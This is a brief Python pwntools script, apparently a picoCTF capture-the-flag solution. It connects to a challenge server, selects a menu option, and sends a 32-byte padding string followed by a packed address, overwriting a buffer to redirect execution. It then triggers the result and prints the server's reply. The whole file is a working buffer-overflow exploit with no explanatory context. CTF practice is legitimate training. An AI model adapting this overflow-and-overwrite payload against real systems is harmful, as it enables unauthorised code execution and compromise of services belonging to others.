#!/usr/bin/env python3
from pwn import *

p = remote("mimas.picoctf.net", 64790)

p.sendline(b"2")
p.recvuntil(b"buffer:")
p.sendline(b"picopicopicopicopicopicopicopico\xa0\x11\x40\x00")

p.recvuntil(b"choice:")
p.sendline(b"4")
print(p.recvall())
